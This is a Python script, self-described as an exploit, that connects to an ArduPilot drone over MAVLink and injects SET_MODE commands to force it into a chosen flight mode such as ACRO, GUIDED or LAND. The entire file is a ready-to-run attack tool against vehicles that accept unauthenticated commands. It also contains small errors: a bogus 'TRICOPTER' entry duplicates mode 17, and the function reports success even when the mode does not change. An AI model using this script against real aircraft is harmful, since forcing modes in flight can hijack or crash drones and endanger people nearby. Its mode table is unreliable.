#!/usr/bin/env python3
"""
Flight Mode Injection Exploit Script
Forces drone into specific flight modes by injecting SET_MODE commands
"""

import sys
import time
from pymavlink import mavutil

# Flight mode mappings for ArduPilot
FLIGHT_MODES = {
    'STABILIZE': 0,
    'ACRO': 1,
    'ALT_HOLD': 2,
    'AUTO': 3,
    'GUIDED': 4,
    'LOITER': 5,
    'RTL': 6,
    'CIRCLE': 7,
    'LAND': 9,
    'BRAKE': 17,
    'THROW': 18,
    'AVOID_ADSB': 19,
    'GUIDED_NOGPS': 20,
    'SMART_RTL': 21,
    'FLOWHOLD': 22,
    'FOLLOW': 23,
    'ZIGZAG': 24,
    'SYSTEMID': 25,
    'HELI_RTL': 26,
    'TRICOPTER': 17,
}

def inject_flight_mode(connection, mode_name):
    """
    Inject flight mode change command
    
    Args:
        connection: MAVLink connection object
        mode_name: Flight mode name (e.g., 'STABILIZE', 'ACRO', 'GUIDED')
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Get mode ID
    if mode_name.upper() in FLIGHT_MODES:
        mode_id = FLIGHT_MODES[mode_name.upper()]
    else:
        try:
            mode_id = int(mode_name)
        except ValueError:
            print(f"[-] Unknown flight mode: {mode_name}")
            print(f"[*] Available modes: {', '.join(FLIGHT_MODES.keys())}")
            return False
    
    print(f"[*] Injecting flight mode change: {mode_name} (mode ID: {mode_id})")
    
    # Send SET_MODE command
    # MAV_MODE_FLAG_CUSTOM_MODE_ENABLED = 1
    connection.mav.set_mode_send(
        target_system,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mode_id
    )
    
    print("[+] Flight mode injection command sent")
    
    # Wait a bit and check if mode changed
    time.sleep(0.5)
    msg = connection.recv_match(type='HEARTBEAT', blocking=True, timeout=2)
    if msg:
        current_mode = msg.custom_mode
        if current_mode == mode_id:
            print(f"[+] Flight mode successfully changed to {mode_name}")
            return True
        else:
            print(f"[!] Mode may not have changed (current: {current_mode}, expected: {mode_id})")
    
    return True

def list_modes():
    """List all available flight modes"""
    print("\nAvailable Flight Modes:")
    for mode_name, mode_id in sorted(FLIGHT_MODES.items(), key=lambda x: x[1]):
        print(f"  {mode_name:20s} (ID: {mode_id})")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 flight_mode_injection.py <connection> <mode>")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  mode          Flight mode name or ID")
        print("\nExamples:")
        print("  python3 flight_mode_injection.py udp:127.0.0.1:14550 STABILIZE")
        print("  python3 flight_mode_injection.py udp:127.0.0.1:14550 ACRO")
        print("  python3 flight_mode_injection.py udp:127.0.0.1:14550 GUIDED")
        print("  python3 flight_mode_injection.py udp:127.0.0.1:14550 4")
        print("\nUse --list to see all available modes")
        sys.exit(1)
    
    if sys.argv[2] == '--list':
        list_modes()
        sys.exit(0)
    
    connection_string = sys.argv[1]
    mode_name = sys.argv[2]
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Inject flight mode
    success = inject_flight_mode(connection, mode_name)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
